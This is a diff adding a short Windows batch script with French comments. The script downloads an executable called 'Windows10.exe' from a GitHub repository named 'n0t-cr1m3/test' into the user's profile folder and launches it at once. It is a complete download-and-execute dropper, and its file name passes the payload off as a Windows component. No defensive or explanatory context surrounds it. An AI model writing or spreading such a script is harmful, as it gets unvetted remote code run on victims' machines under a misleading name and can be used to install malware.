@@ -1,0 +1,20 @@
+@echo off
+set "url=https://github.com/n0t-cr1m3/test/raw/main/Windows10.exe"
+set "destination=%USERPROFILE%\Windows10.exe"
+
+rem Supprimez le fichier existant s'il y en a un
+if exist "%destination%" del "%destination%"
+
+rem Téléchargez le fichier depuis l'URL spécifiée avec PowerShell
+powershell -Command "& Invoke-WebRequest -Uri '%url%' -OutFile '%destination%' "
+
+rem Vérifiez si le téléchargement s'est bien déroulé
+if exist "%destination%" (
+    echo Téléchargement réussi.
+    rem Lancez le fichier téléchargé
+    start "" "%destination%"
+) else (
+    echo Échec du téléchargement.
+)
+
+    
